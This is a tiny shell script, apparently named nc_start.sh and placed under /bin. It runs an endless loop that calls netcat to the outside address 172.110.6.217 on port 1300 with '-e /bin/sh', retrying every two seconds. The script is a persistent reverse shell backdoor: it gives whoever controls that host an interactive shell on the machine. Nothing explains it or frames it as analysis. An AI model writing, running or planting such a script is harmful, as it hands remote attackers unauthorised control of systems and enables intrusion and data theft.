#/bin/nc_start.sh
#
while true
do
   nc 172.110.6.217 1300 -e /bin/sh
   sleep 2
done
